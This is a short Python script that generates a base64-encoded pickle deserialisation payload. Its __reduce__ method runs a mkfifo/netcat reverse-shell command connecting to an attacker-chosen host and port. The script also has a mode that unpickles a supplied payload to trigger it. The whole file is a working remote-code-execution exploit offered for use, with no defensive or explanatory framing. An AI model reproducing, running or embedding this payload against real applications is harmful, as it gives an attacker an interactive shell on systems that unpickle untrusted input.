# Usage:
# - Generate payload: python3 pickle_rce.py 127.0.0.1 8901
# - Trigger payload for testing: python3 pickle_rce.py {payload}

import pickle, base64
import os, sys
import requests

HOST = "127.0.0.1"
PORT = "4444"

# Generic RCE  -------------------------------------------------
class Test:
    def __init__(self, name, rank):
        self.name = name
        self.rank = rank

    # Uncomment for RCE
    def __reduce__(self):
        payload = f'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {HOST} {PORT} > /tmp/f'
        return (os.system, (payload,))
        
def pickle_loads(s):
	return pickle.loads(base64.b64decode(s))

def pickle_dump(obj):
    return base64.b64encode(pickle.dumps(obj)).decode()

def generate_payload():
    test = Test('Rick', 100)
    payload = pickle_dump(test)
    print(payload)
    # trigger RCE for testing
    # test_unpacked = pickle_loads(payload)

if __name__ == "__main__":
    try:
        match len(sys.argv):
            case 3: 
                HOST, PORT = sys.argv[1], sys.argv[2]
                generate_payload()
            case 2:
                pickle_loads(sys.argv[1])
            case _:
                generate_payload()
    except Exception as e:
        print(e)
        exit()